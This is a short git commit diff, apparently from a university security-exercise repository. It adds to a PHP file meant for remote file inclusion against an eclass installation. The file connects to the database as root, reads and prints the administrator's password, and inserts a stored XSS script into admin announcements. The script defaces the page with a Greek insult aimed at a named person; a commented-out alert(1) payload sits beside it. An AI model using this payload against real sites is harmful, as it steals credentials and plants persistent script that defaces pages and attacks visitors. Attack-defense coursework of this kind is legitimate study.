2afeef56e34729057258d4b86654a0b74ce8b212
john daridis <sdi1700028@di.uoa.gr>
2021-04-30 17:14:07 +0300

    Added sql-xss-rfi combo.

--- rfi_helper.php
+++ rfi_helper.php
@@ -9,6 +9,12 @@ $db = mysql_connect('db', 'root', '1234');
 $res = db_query("SELECT password FROM eclass.user where user_id = 1", 'eclass');
 $row = mysql_fetch_row($res);
 echo $row[0];
+$newContent_en = "<script> document.body.innerHTML = \'<p>O <small> pantelis </small> einai <i><b>vlakas</b></i></p> <p>H <sub>2</sub> O</p><br/><h1>My style rocks</h1><p>Lets give some style heeere</p>\' </script>";
+// $newContent_en = "<script> alert(1) </script>";
+db_query("INSERT INTO admin_announcements
+                SET gr_title = '', gr_body = '', gr_comment = '',
+                en_title = '', en_body = '$newContent_en', en_comment = '',
+                visible = 'V', date = NOW()");
 
 
 ?>
